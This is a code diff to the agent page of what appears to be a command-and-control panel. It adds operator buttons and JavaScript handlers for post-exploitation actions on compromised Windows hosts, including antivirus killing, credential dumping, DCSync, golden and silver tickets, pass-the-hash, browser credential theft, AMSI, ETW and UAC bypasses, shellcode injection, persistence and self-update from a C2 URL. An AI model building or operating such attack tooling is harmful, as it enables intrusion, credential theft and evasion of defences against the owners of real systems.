@@ -23,6 +23,14 @@
             </div>
         </div>
         <div class="flex items-center gap-2">
+            <div id="lock-indicator-{{.Agent.ID}}"></div>
+            <button onclick="toggleLock('{{.Agent.ID}}')" class="px-3 py-2 border border-slate-200 hover:border-amber-300 text-slate-500 hover:text-amber-600 text-sm font-medium rounded-xl transition-colors" title="锁定/解锁 Agent 独占操作">
+                <i class="fa-solid fa-lock-open"></i>
+            </button>
+            <div id="agent-viewers-{{.Agent.ID}}" class="hidden px-2.5 py-1.5 bg-indigo-50 border border-indigo-200 rounded-xl flex items-center gap-1.5 text-xs text-indigo-600">
+                <i class="fa-solid fa-eye"></i>
+                <span id="agent-viewers-label-{{.Agent.ID}}"></span>
+            </div>
             <a href="/agents/{{.Agent.ID}}/shell" class="px-4 py-2 bg-emerald-600 hover:bg-emerald-700 text-white text-sm font-medium rounded-xl transition-colors">
                 <i class="fa-solid fa-terminal mr-2"></i>Shell
             </a>
@@ -312,6 +320,14 @@
                     {{end}}
                 </div>
 
+                <!-- rportfwd Relay Status -->
+                <div class="bg-white border border-slate-200 rounded-3xl p-6 shadow-sm">
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center gap-2"><i class="fa-solid fa-arrows-left-right text-slate-400"></i><span class="text-sm font-semibold text-slate-900">rportfwd 中继</span></div>
+                    </div>
+                    <div id="rportfwd-status" class="text-sm text-slate-500">加载中...</div>
+                </div>
+
                 <!-- Screenshots -->
                 <div class="bg-white border border-slate-200 rounded-3xl p-6 shadow-sm">
                     <div class="flex items-center justify-between mb-4">
@@ -368,13 +384,16 @@
                 <div class="text-xs text-slate-500 font-medium">快捷命令</div>
 
                 <details open>
-                    <summary class="text-sm font-semibold text-slate-700 cursor-pointer hover:text-indigo-600 mb-2">🖥️ 系统信息</summary>
+                    <summary class="text-sm font-semibold text-slate-700 cursor-pointer hover:text-indigo-600 mb-2">⚠️ 特殊操作</summary>
                     <div class="flex flex-wrap gap-1.5 mt-2">
-                        <button onclick="sendQuickCommand('{{.Agent.ID}}', 'whoami')" class="px-3 py-1.5 bg-slate-100 hover:bg-slate-200 rounded-xl text-xs text-slate-700"><i class="fa-solid fa-user mr-1"></i>whoami</button>
-                        <button onclick="sendQuickCommand('{{.Agent.ID}}', 'systeminfo')" class="px-3 py-1.5 bg-slate-100 hover:bg-slate-200 rounded-xl text-xs text-slate-700"><i class="fa-solid fa-info-circle mr-1"></i>systeminfo</button>
-                        <button onclick="sendQuickCommand('{{.Agent.ID}}', 'ipconfig /all')" class="px-3 py-1.5 bg-slate-100 hover:bg-slate-200 rounded-xl text-xs text-slate-700"><i class="fa-solid fa-network-wired mr-1"></i>ipconfig</button>
-                        <button onclick="sendQuickCommand('{{.Agent.ID}}', 'net user')" class="px-3 py-1.5 bg-slate-100 hover:bg-slate-200 rounded-xl text-xs text-slate-700">Users</button>
-                        <button onclick="sendQuickCommandPS('{{.Agent.ID}}', 'Get-NetIPAddress')" class="px-3 py-1.5 bg-blue-100 hover:bg-blue-200 rounded-xl text-xs text-blue-700">Get-NetIPAddress</button>
+                        <button onclick="sendQuickCommand('{{.Agent.ID}}', 'shutdown /r /t 0')" class="px-3 py-1.5 bg-orange-100 hover:bg-orange-200 rounded-xl text-xs text-orange-700">Reboot</button>
+                        <button onclick="killAVQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-red-200 hover:bg-red-300 rounded-xl text-xs text-red-800 font-medium">Kill AV</button>
+                        <button onclick="elevateQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-purple-100 hover:bg-purple-200 rounded-xl text-xs text-purple-700">Elevate</button>
+                        <button onclick="credsQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-amber-100 hover:bg-amber-200 rounded-xl text-xs text-amber-700">Creds</button>
+                        <button onclick="injectQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-slate-100 hover:bg-slate-200 rounded-xl text-xs text-slate-700">Inject</button>
+                        <button onclick="lateralQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-indigo-100 hover:bg-indigo-200 rounded-xl text-xs text-indigo-700">Lateral</button>
+                        <button onclick="socksQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-teal-100 hover:bg-teal-200 rounded-xl text-xs text-teal-700">SOCKS</button>
+                        <button onclick="persistenceQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-rose-100 hover:bg-rose-200 rounded-xl text-xs text-rose-700">Persistence</button>
                     </div>
                 </details>
 
@@ -445,8 +464,50 @@
                         <button onclick="kerberoastQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-purple-100 hover:bg-purple-200 rounded-xl text-xs text-purple-700"><i class="fa-solid fa-mask mr-1"></i>Kerberoast</button>
                         <button onclick="mimikatzQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-amber-100 hover:bg-amber-200 rounded-xl text-xs text-amber-700"><i class="fa-solid fa-hat-wizard mr-1"></i>Mimikatz</button>
                         <button onclick="executeAssemblyQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-blue-100 hover:bg-blue-200 rounded-xl text-xs text-blue-700"><i class="fa-solid fa-cube mr-1"></i>Execute-Assembly</button>
+                        <button onclick="powerPickQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-sky-100 hover:bg-sky-200 rounded-xl text-xs text-sky-700"><i class="fa-solid fa-bolt mr-1"></i>PowerPick</button>
                         <button onclick="bofQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-indigo-100 hover:bg-indigo-200 rounded-xl text-xs text-indigo-700"><i class="fa-solid fa-bolt mr-1"></i>BOF</button>
                         <button onclick="printNightmareQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-red-100 hover:bg-red-200 rounded-xl text-xs text-red-700"><i class="fa-solid fa-print mr-1"></i>PrintNightmare</button>
+                        <button onclick="peloaderQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-orange-100 hover:bg-orange-200 rounded-xl text-xs text-orange-700"><i class="fa-solid fa-cubes mr-1"></i>PE Loader</button>
+                        <button onclick="executeAssemblyForkRunQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-rose-100 hover:bg-rose-200 rounded-xl text-xs text-rose-700"><i class="fa-solid fa-code-fork mr-1"></i>Fork&Run</button>
+                        <button onclick="spawnQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-slate-100 hover:bg-slate-200 rounded-xl text-xs text-slate-700"><i class="fa-solid fa-biohazard mr-1"></i>Spawn</button>
+                        <button onclick="rportfwdRelayQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-teal-100 hover:bg-teal-200 rounded-xl text-xs text-teal-700"><i class="fa-solid fa-arrows-left-right mr-1"></i>rportfwd</button>
+                        <button onclick="dcsyncQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-fuchsia-100 hover:bg-fuchsia-200 rounded-xl text-xs text-fuchsia-700"><i class="fa-solid fa-cloud-arrow-down mr-1"></i>DCSync</button>
+                        <button onclick="goldenTicketQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-yellow-100 hover:bg-yellow-200 rounded-xl text-xs text-yellow-700"><i class="fa-solid fa-ticket mr-1"></i>Golden Ticket</button>
+                        <button onclick="silverTicketQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-yellow-100 hover:bg-yellow-200 rounded-xl text-xs text-yellow-700"><i class="fa-solid fa-ticket mr-1"></i>Silver Ticket</button>
+                        <button onclick="asreproastQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-purple-100 hover:bg-purple-200 rounded-xl text-xs text-purple-700"><i class="fa-solid fa-sun mr-1"></i>ASREP Roast</button>
+                        <button onclick="passTheHashQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-red-100 hover:bg-red-200 rounded-xl text-xs text-red-700"><i class="fa-solid fa-key mr-1"></i>Pass-the-Hash</button>
+                        <button onclick="passTheTicketQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-orange-100 hover:bg-orange-200 rounded-xl text-xs text-orange-700"><i class="fa-solid fa-ticket mr-1"></i>Pass-the-Ticket</button>
+                        <button onclick="browserStealQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-cyan-100 hover:bg-cyan-200 rounded-xl text-xs text-cyan-700"><i class="fa-solid fa-globe mr-1"></i>Browser Steal</button>
+                        <button onclick="amsiBypassQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-green-100 hover:bg-green-200 rounded-xl text-xs text-green-700"><i class="fa-solid fa-shield-halved mr-1"></i>AMSI Bypass</button>
+                        <button onclick="etwBypassQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-green-100 hover:bg-green-200 rounded-xl text-xs text-green-700"><i class="fa-solid fa-eye-slash mr-1"></i>ETW Bypass</button>
+                        <button onclick="selfUpdateQuick('{{.Agent.ID}}')" class="px-3 py-1.5 bg-yellow-100 hover:bg-yellow-200 rounded-xl text-xs text-yellow-700"><i class="fa-solid fa-rotate mr-1"></i>Self-Update</button>
+                    </div>
+                </details>
+
+                <details>
+                    <summary class="text-sm font-semibold text-slate-700 cursor-pointer hover:text-indigo-600 mb-2">⬆️ UAC 绕过工具箱</summary>
+                    <div class="flex flex-wrap gap-1.5 mt-2">
+                        <button onclick="uacBypassQuick('{{.Agent.ID}}', 'eventvwr')" class="px-3 py-1.5 bg-purple-100 hover:bg-purple-200 rounded-xl text-xs text-purple-700"><i class="fa-solid fa-shield mr-1"></i>EventVwr</button>
+                        <button onclick="uacBypassQuick('{{.Agent.ID}}', 'fodhelper')" class="px-3 py-1.5 bg-purple-100 hover:bg-purple-200 rounded-xl text-xs text-purple-700"><i class="fa-solid fa-shield mr-1"></i>FodHelper</button>
+                        <button onclick="uacBypassQuick('{{.Agent.ID}}', 'computerdefaults')" class="px-3 py-1.5 bg-purple-100 hover:bg-purple-200 rounded-xl text-xs text-purple-700"><i class="fa-solid fa-shield mr-1"></i>ComputerDefaults</button>
+                        <button onclick="uacBypassQuick('{{.Agent.ID}}', 'sdclt')" class="px-3 py-1.5 bg-purple-100 hover:bg-purple-200 rounded-xl text-xs text-purple-700"><i class="fa-solid fa-shield mr-1"></i>SDCLT</button>
+                        <button onclick="uacBypassQuick('{{.Agent.ID}}', 'cmstp')" class="px-3 py-1.5 bg-purple-100 hover:bg-purple-200 rounded-xl text-xs text-purple-700"><i class="fa-solid fa-shield mr-1"></i>CMSTP</button>
+                    </div>
+                </details>
+
+                <details>
+                    <summary class="text-sm font-semibold text-slate-700 cursor-pointer hover:text-indigo-600 mb-2">🌐 Net Command Suite</summary>
+                    <div class="flex flex-wrap gap-1.5 mt-2">
+                        <button onclick="netCommandQuick('{{.Agent.ID}}', 'view')" class="px-3 py-1.5 bg-cyan-100 hover:bg-cyan-200 rounded-xl text-xs text-cyan-700"><i class="fa-solid fa-network-wired mr-1"></i>net view</button>
+                        <button onclick="netCommandQuick('{{.Agent.ID}}', 'group /domain')" class="px-3 py-1.5 bg-cyan-100 hover:bg-cyan-200 rounded-xl text-xs text-cyan-700"><i class="fa-solid fa-users mr-1"></i>net group /domain</button>
+                        <button onclick="netCommandQuick('{{.Agent.ID}}', 'localgroup Administrators')" class="px-3 py-1.5 bg-cyan-100 hover:bg-cyan-200 rounded-xl text-xs text-cyan-700"><i class="fa-solid fa-shield mr-1"></i>net localgroup Admins</button>
+                        <button onclick="netCommandQuick('{{.Agent.ID}}', 'user')" class="px-3 py-1.5 bg-cyan-100 hover:bg-cyan-200 rounded-xl text-xs text-cyan-700"><i class="fa-solid fa-user mr-1"></i>net user</button>
+                        <button onclick="netCommandQuick('{{.Agent.ID}}', 'accounts')" class="px-3 py-1.5 bg-cyan-100 hover:bg-cyan-200 rounded-xl text-xs text-cyan-700"><i class="fa-solid fa-book mr-1"></i>net accounts</button>
+                        <button onclick="netCommandQuick('{{.Agent.ID}}', 'share')" class="px-3 py-1.5 bg-cyan-100 hover:bg-cyan-200 rounded-xl text-xs text-cyan-700"><i class="fa-solid fa-share-alt mr-1"></i>net share</button>
+                    </div>
+                    <div class="flex gap-2 mt-2">
+                        <input id="net-custom-{{.Agent.ID}}" type="text" placeholder="custom net command..." class="flex-1 px-3 py-1.5 bg-white border border-slate-300 text-sm rounded-xl font-mono">
+                        <button onclick="netCommandQuickCustom('{{.Agent.ID}}')" class="px-4 py-1.5 bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-medium rounded-xl">执行</button>
                     </div>
                 </details>
             </div>
@@ -481,6 +542,7 @@
                         </div>
                         <span class="text-[10px] text-slate-400 font-mono">{{.CreatedAt | formatTime}}</span>
                     </div>
+                    {{if .CreatedBy}}<div class="text-[10px] text-slate-400 mb-1"><i class="fa-solid fa-user mr-0.5"></i>{{.CreatedBy}}</div>{{end}}
                     <div class="font-mono text-xs text-slate-700 bg-slate-50 rounded-xl p-3 mb-2 break-all">{{.Command}}</div>
                     {{if .Result}}
                     <div class="bg-gradient-to-br from-emerald-50 to-green-50 border border-emerald-200 rounded-xl p-3 max-h-32 overflow-auto">
@@ -501,6 +563,9 @@
                             {{.Status | upper}}
                         </span>
                         <div class="flex items-center gap-2">
+                            {{if or (eq .Status "pending") (eq .Status "running")}}
+                            <button onclick="cancelTask('{{$.Agent.ID}}', {{.ID}})" class="text-[10px] px-2.5 py-1 bg-red-50 hover:bg-red-100 text-red-600 rounded-full font-medium transition-colors" title="取消任务"><i class="fa-solid fa-ban mr-0.5"></i>取消</button>
+                            {{end}}
                             <button onclick="rerunTaskFromDetail('{{$.Agent.ID}}', {{.ID}})" class="text-[10px] px-2.5 py-1 bg-indigo-50 hover:bg-indigo-100 text-indigo-600 rounded-full font-medium transition-colors" title="重新执行"><i class="fa-solid fa-redo mr-0.5"></i>重跑</button>
                             {{if .UpdatedAt.After .CreatedAt}}
                             <span class="text-[10px] text-slate-400"><i class="fa-solid fa-clock mr-1"></i>{{.UpdatedAt.Sub .CreatedAt}}</span>
@@ -541,6 +606,8 @@
         switchTab('overview');
         // Start auto-refresh for pending tasks
         setInterval(() => { if (currentTab === 'tasks') checkPendingTasks(); }, 5000);
+        // rportfwd status polling
+        fetchRPortFwdStatus('{{.Agent.ID}}');
     });
 
     // ---- Auto-refresh Tasks ----
@@ -631,6 +698,24 @@
     function credsQuick(agentId) { fetch(`/agents/${agentId}/creds`, { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) showToast('Creds dump requested'); }); }
     function injectQuick(agentId) { const pid = prompt("Target PID:"); if (!pid) return; fetch(`/agents/${agentId}/inject`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'pid=' + encodeURIComponent(pid) + '&tech=&shellcode=' }); showToast('Inject sent'); }
     function lateralQuick(agentId) { const spec = prompt("Lateral spec:", "winrm|127.0.0.1||whoami"); if (!spec) return; fetch(`/agents/${agentId}/lateral`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'spec=' + encodeURIComponent(spec) }); showToast('Lateral sent'); }
+    function spawnQuick(agentId) {
+        const target = prompt("Target executable:", "rundll32.exe");
+        if (!target) return;
+        const technique = prompt("Technique (CreateRemoteThread or QueueUserAPC):", "CreateRemoteThread");
+        if (!technique) return;
+        const input = document.createElement('input');
+        input.type = 'file'; input.accept = '.bin,.raw';
+        input.onchange = function() {
+            const file = input.files[0]; if (!file) return;
+            const fd = new FormData();
+            fd.append('target', target);
+            fd.append('technique', technique);
+            fd.append('shellcode', file);
+            fetch(`/agents/${agentId}/spawn`, { method: 'POST', body: fd })
+                .then(r => r.json()).then(d => showToast(d.message || 'Spawn sent'));
+        };
+        input.click();
+    }
     function socksQuick(agentId) { const port = prompt("SOCKS5 port:", "1080"); fetch(`/agents/${agentId}/socks`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'port=' + encodeURIComponent(port || "1080") }); showToast('SOCKS sent'); }
     function tokenListProcsQuick(agentId) { fetch(`/agents/${agentId}/token/list`, { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) showToast('Enum tokens sent'); }); }
     function tokenWhoamiQuick(agentId) { fetch(`/agents/${agentId}/token/whoami`, { method: 'POST' }).then(r => r.json()).then(d => { if (d.success) showToast('Token whoami sent'); }); }
@@ -666,6 +751,14 @@
             .then(() => { showToast('Agent 已删除'); setTimeout(() => window.location = '/agents', 800); });
     }
 
+    function cancelTask(agentId, taskId) {
+        if (!confirm('确定取消任务 #' + taskId + ' 吗？')) return;
+        fetch(`/agents/${agentId}/tasks/${taskId}/cancel`, { method: 'POST' })
+            .then(r => r.json()).then(data => {
+                if (data.success) { showToast('任务已取消'); checkPendingTasks(); }
+                else showToast('取消失败: ' + (data.error || ''), 'error');
+            }).catch(err => showToast('请求失败: ' + err, 'error'));
+    }
     function rerunTaskFromDetail(agentId, taskId) {
         fetch(`/agents/${agentId}/task/${taskId}/rerun`, { method: 'POST' })
             .then(r => r.json()).then(data => {
@@ -735,12 +828,276 @@
         };
         input.click();
     }
+    function powerPickQuick(agentId) {
+        const script = prompt('PowerShell script to execute:', 'Get-Process | Out-String');
+        if (!script) return;
+        fetch(`/agents/${agentId}/powerpick`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'script=' + encodeURIComponent(script) })
+            .then(r => r.json()).then(d => showToast(d.message || 'PowerPick sent'));
+    }
     function printNightmareQuick(agentId) {
         const dll = prompt('Full path to DLL on target (upload via File Browser first):', 'C:\\Windows\\Temp\\evil.dll');
         if (!dll) return;
         fetch(`/agents/${agentId}/elevate/printnightmare`, { method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: 'dll_path=' + encodeURIComponent(dll) })
             .then(r => r.json()).then(d => showToast('PrintNightmare sent'));
     }
+    function fetchRPortFwdStatus(agentId) {
+        fetch(`/agents/${agentId}/rportfwd/status`)
+            .then(r => r.json()).then(data => {
+                const el = document.getElementById('rportfwd-status');
+                if (!el) return;
+                if (data.active) {
+                    el.innerHTML = '<div class="flex items-center justify-between"><span class="text-emerald-600 font-medium">端口 ' + data.port + ' → ' + data.target + '</span><span class="text-xs text-slate-400">活跃</span></div>';
+                } else {
+                    el.innerHTML = '<span class="text-slate-400">未启用</span>';
+                }
+            }).catch(() => {});
+    }
+
+    // ── P0 Feature Functions ────────────────────────────────────────────
+    function peloaderQuick(agentId) {
+        const input = document.createElement('input');
+        input.type = 'file'; input.accept = '.dll';
+        input.onchange = function() {
+            const file = input.files[0]; if (!file) return;
+            const fd = new FormData(); fd.append('dll', file);
+            fetch(`/agents/${agentId}/peloader`, { method: 'POST', body: fd })
+                .then(r => r.json()).then(d => showToast(d.message || 'PE Loader sent'));
+        };
+        input.click();
+    }
+    function executeAssemblyForkRunQuick(agentId) {
+        const input = document.createElement('input');
+        input.type = 'file'; input.accept = '.exe,.dll,.net';
+        input.onchange = function() {
+            const file = input.files[0]; if (!file) return;
+            const fd = new FormData(); fd.append('assembly', file);
+            fetch(`/agents/${agentId}/execute_assembly_forkrun`, { method: 'POST', body: fd })
+                .then(r => r.json()).then(d => showToast(d.message || 'Fork&Run sent'));
+        };
+        input.click();
+    }
+    function rportfwdRelayQuick(agentId) {
+        const lport = prompt('Local listening port:', '1081');
+        if (!lport) return;
+        const target = prompt('Forward target (host:port):', '10.0.0.1:3389');
+        if (!target) return;
+        fetch(`/agents/${agentId}/rportfwd/start`, {
+            method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},
+            body: 'lport=' + encodeURIComponent(lport) + '&target=' + encodeURIComponent(target)
+        }).then(r => r.json()).then(d => showToast(d.message || 'rportfwd started'));
+    }
+    function dcsyncQuick(agentId) {
+        const user = prompt('Target user (default: krbtgt):', 'krbtgt');
+        fetch(`/agents/${agentId}/dcsync`, {
+            method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},
+            body: 'user=' + encodeURIComponent(user || 'krbtgt')
+        }).then(r => r.json()).then(d => showToast(d.message || 'DCSync sent'));
+    }
+    function goldenTicketQuick(agentId) {
+        const user = prompt('Username:'); if (!user) return;
+        const domain = prompt('Domain:'); if (!domain) return;
+        const sid = prompt('Domain SID:'); if (!sid) return;
+        const hash = prompt('krbtgt NTLM hash:'); if (!hash) return;
+        fetch(`/agents/${agentId}/golden_ticket`, {
+            method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},
+            body: 'user=' + encodeURIComponent(user) + '&domain=' + encodeURIComponent(domain) + '&sid=' + encodeURIComponent(sid) + '&krbtgt_hash=' + encodeURIComponent(hash)
+        }).then(r => r.json()).then(d => showToast(d.message || 'Golden ticket sent'));
+    }
+    function silverTicketQuick(agentId) {
+        const user = prompt('Username:'); if (!user) return;
+        const domain = prompt('Domain:'); if (!domain) return;
+        const sid = prompt('Domain SID:'); if (!sid) return;
+        const target = prompt('Target service (e.g. CIFS/SERVER):'); if (!target) return;
+        const hash = prompt('Service RC4 hash:'); if (!hash) return;
+        fetch(`/agents/${agentId}/silver_ticket`, {
+            method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},
+            body: 'user=' + encodeURIComponent(user) + '&domain=' + encodeURIComponent(domain) + '&sid=' + encodeURIComponent(sid) + '&target=' + encodeURIComponent(target) + '&rc4_hash=' + encodeURIComponent(hash)
+        }).then(r => r.json()).then(d => showToast(d.message || 'Silver ticket sent'));
+    }
+    function asreproastQuick(agentId) {
+        fetch(`/agents/${agentId}/asreproast`, { method: 'POST' })
+            .then(r => r.json()).then(d => showToast(d.message || 'ASREP roast sent'));
+    }
+    function passTheHashQuick(agentId) {
+        const user = prompt('Username:'); if (!user) return;
+        const domain = prompt('Domain:'); if (!domain) return;
+        const hash = prompt('NTLM hash:'); if (!hash) return;
+        const target = prompt('Target (host:port, optional):') || '';
+        fetch(`/agents/${agentId}/pass_the_hash`, {
+            method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},
+            body: 'user=' + encodeURIComponent(user) + '&domain=' + encodeURIComponent(domain) + '&ntlm_hash=' + encodeURIComponent(hash) + '&target=' + encodeURIComponent(target)
+        }).then(r => r.json()).then(d => showToast(d.message || 'PTH sent'));
+    }
+    function passTheTicketQuick(agentId) {
+        const input = document.createElement('input');
+        input.type = 'file'; input.accept = '.kirbi,.bin';
+        input.onchange = function() {
+            const file = input.files[0]; if (!file) return;
+            const fd = new FormData(); fd.append('ticket', file);
+            fetch(`/agents/${agentId}/pass_the_ticket`, { method: 'POST', body: fd })
+                .then(r => r.json()).then(d => showToast(d.message || 'PTT sent'));
+        };
+        input.click();
+    }
+    function persistenceQuick(agentId) {
+        const methods = ["registry", "scheduled_task", "startup_folder", "wmi", "service", "image_file", "com_hijack", "dll_search_order"];
+        const method = prompt("Persistence method:\n" + methods.join(", "), "registry");
+        if (!method || !methods.includes(method)) return;
+        const action = prompt("Action (add, list, remove):", "add");
+        if (!action || !["add","list","remove"].includes(action)) return;
+        if (action === "list") {
+            fetch(`/agents/${agentId}/persistence`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'action=list'
+            }).then(r => r.json()).then(d => { if (d.success) showToast('Persistence list requested'); });
+            return;
+        }
+        let body = 'action=' + action + '&method=' + encodeURIComponent(method);
+        if (action === "add" || action === "remove") {
+            if (method === "dll_search_order") {
+                const dllPath = prompt("Full path to DLL on target:", "C:\\Windows\\Temp\\evil.dll");
+                if (!dllPath) return;
+                body += '&binary_path=' + encodeURIComponent(dllPath);
+            } else {
+                const binPath = prompt("Binary path (leave empty for current exe):", "");
+                if (binPath) body += '&binary_path=' + encodeURIComponent(binPath);
+            }
+        }
+        fetch(`/agents/${agentId}/persistence`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: body
+        }).then(r => r.json()).then(d => { if (d.success) showToast('Persistence ' + action + ' sent for ' + method); });
+    }
+
+    function browserStealQuick(agentId) {
+        const browser = prompt("Browser (chrome, edge, firefox, all):", "all");
+        if (!browser) return;
+        fetch(`/agents/${agentId}/browser_steal`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'browser=' + encodeURIComponent(browser)
+        }).then(r => r.json()).then(d => showToast(d.message || 'Browser steal sent'));
+    }
+    function uacBypassQuick(agentId, method) {
+        const payload = prompt('Payload path (leave empty for current agent binary):', window.location.origin + '/...');
+        let body = 'method=' + encodeURIComponent(method);
+        if (payload && payload.trim() !== '') {
+            body += '&payload=' + encodeURIComponent(payload.trim());
+        }
+        fetch(`/agents/${agentId}/uac_bypass`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: body
+        }).then(r => r.json()).then(d => { if (d.success) showToast('UAC bypass (' + method + ') sent'); });
+    }
+    function amsiBypassQuick(agentId) {
+        fetch(`/agents/${agentId}/amsi_bypass`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+        }).then(r => r.json()).then(d => { if (d.success) showToast('AMSI bypass sent'); });
+    }
+    function etwBypassQuick(agentId) {
+        fetch(`/agents/${agentId}/etw_bypass`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+        }).then(r => r.json()).then(d => { if (d.success) showToast('ETW bypass sent'); });
+    }
+    function selfUpdateQuick(agentId) {
+        const url = prompt('下载新 Agent 的 URL:', 'http://your-c2-server/path/to/new-agent.exe');
+        if (!url) return;
+        fetch(`/agents/${agentId}/self_update`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'url=' + encodeURIComponent(url)
+        }).then(r => r.json()).then(d => { if (d.success) showToast('Self-update sent — agent will restart'); });
+    }
+
+    // ── Net Command Suite ────────────────────────────────────────────
+    function netCommandQuick(agentId, cmd) {
+        document.getElementById('cmd-result').innerHTML = '<div class="text-yellow-400">正在执行: net ' + cmd + '...</div>';
+        fetch(`/agents/${agentId}/net`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'command=' + encodeURIComponent(cmd)
+        }).then(r => r.json()).then(data => {
+            if (data.success) setTimeout(() => fetchResult(agentId, data.task_id, 'cmd-result'), 1500);
+        });
+    }
+    function netCommandQuickCustom(agentId) {
+        const inp = document.getElementById('net-custom-' + agentId);
+        const cmd = inp ? inp.value.trim() : '';
+        if (!cmd) return;
+        netCommandQuick(agentId, cmd);
+    }
+
+    // ─── Agent Lock/Unlock ───
+    async function toggleLock(agentId) {
+        const indicator = document.getElementById('lock-indicator-' + agentId);
+        if (!indicator) return;
+        const isLocked = indicator.getAttribute('data-locked') === 'true';
+        const url = isLocked ? `/agents/${agentId}/unlock` : `/agents/${agentId}/lock`;
+        try {
+            const resp = await fetch(url, { method: 'POST', headers: { 'X-CSRF-Token': getCSRFToken() } });
+            const data = await resp.json();
+            if (data.success) {
+                showToast(isLocked ? '已解锁' : '已锁定', 'success');
+                if (isLocked) {
+                    indicator.innerHTML = '';
+                    indicator.removeAttribute('data-locked');
+                } else {
+                    indicator.innerHTML = '<span class="text-xs bg-amber-100 text-amber-700 px-2 py-1 rounded-full"><i class="fa-solid fa-lock mr-1"></i>您已锁定</span>';
+                    indicator.setAttribute('data-locked', 'true');
+                }
+            } else {
+                showToast('锁定失败: ' + (data.error || ''), 'error');
+            }
+        } catch (e) {
+            showToast('请求失败', 'error');
+        }
+    }
+
+    // ─── Load lock status on page load ───
+    document.addEventListener('DOMContentLoaded', function() {
+        const agentId = '{{.Agent.ID}}';
+        fetch('/api/collab/locks').then(r => r.json()).then(d => {
+            if (d.success && d.locks) {
+                const lock = d.locks.find(l => l.agent_id === agentId);
+                const indicator = document.getElementById('lock-indicator-' + agentId);
+                if (lock && indicator) {
+                    indicator.innerHTML = `<span class="text-xs bg-amber-100 text-amber-700 px-2 py-1 rounded-full"><i class="fa-solid fa-lock mr-1"></i>${lock.username}</span>`;
+                }
+            }
+        }).catch(() => {});
+        refreshAgentViewers(agentId);
+        setInterval(() => refreshAgentViewers(agentId), 10000);
+        // Listen for real-time viewer updates via WS
+        window.addEventListener('collab:viewing_agent', function(e) {
+            if (e.detail && e.detail.agent_id === agentId) {
+                refreshAgentViewers(agentId);
+            }
+        });
+    });
+
+    // ─── Agent Viewers: who's watching the same agent ───
+    async function refreshAgentViewers(agentId) {
+        try {
+            const resp = await fetch('/api/collab/agent-viewers/' + agentId);
+            const data = await resp.json();
+            const container = document.getElementById('agent-viewers-' + agentId);
+            const label = document.getElementById('agent-viewers-label-' + agentId);
+            if (!container || !label) return;
+            const others = data.viewers ? data.viewers.filter(v => v.username !== '{{.UserDisplayName}}') : [];
+            if (others.length > 0) {
+                container.classList.remove('hidden');
+                label.textContent = others.map(v => v.username).join(', ');
+            } else {
+                container.classList.add('hidden');
+            }
+        } catch(e) {}
+    }
+
     function escapeHtml(text) {
         const div = document.createElement('div');
         div.textContent = text;
